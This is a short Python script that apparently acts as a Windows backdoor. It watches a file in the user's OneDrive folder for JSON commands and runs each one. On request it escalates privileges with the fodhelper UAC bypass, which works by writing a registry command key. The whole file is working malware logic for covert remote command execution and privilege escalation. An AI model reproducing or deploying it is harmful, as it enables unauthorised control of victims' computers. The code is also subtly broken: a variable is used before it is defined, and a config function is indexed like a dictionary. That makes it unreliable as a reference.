import winreg
import os
import time
import json

from config import get_configs, ConfigKey

def run_command_with_uac_bypass(command):
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    with winreg.CreateKeyEx(hkcu_key, "Software\\Classes\\ms-settings\\Shell\\Open") as reg_key:
        winreg.SetValueEx(command_key, "DelegateExecute", 0, winreg.REG_SZ, "")
        
        with winreg.CreateKeyEx(reg_key, "command") as command_key:
            winreg.SetValue(command_key, None, winreg.REG_SZ, command)

    os.system("fodhelper.exe")

def get_onedrive_sync_folder():
    hkcu_key = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
    with winreg.OpenKey(hkcu_key, "Software\\Microsoft\\OneDrive\\Accounts\\Personal") as onedrive_personal_reg_key:
        onedrive_sync_folder = winreg.QueryValueEx(onedrive_personal_reg_key, "UserFolder")[0]
    return onedrive_sync_folder

def main():
    file_name = os.path.join(get_onedrive_sync_folder(), get_configs[ConfigKey.CMD_FILE_NAME.value])
    if os.path.exists(file_name):
        original_time = os.path.getmtime(file_name)
    else:
        original_time = 0

    while(True):
        if os.path.exists(file_name) and os.path.getmtime(file_name) > original_time:
            with open(file_name, "r") as f:
                cmd_json = json.load(f)
            original_time = os.path.getmtime(file_name)
            command = cmd_json.get("command", None)
            if None == command:
                continue
            if cmd_json.get("uac", False): 
                run_command_with_uac_bypass(command)
            else:
                os.system(command)
        time.sleep(1)
        

if "__main__" == __name__:
    main()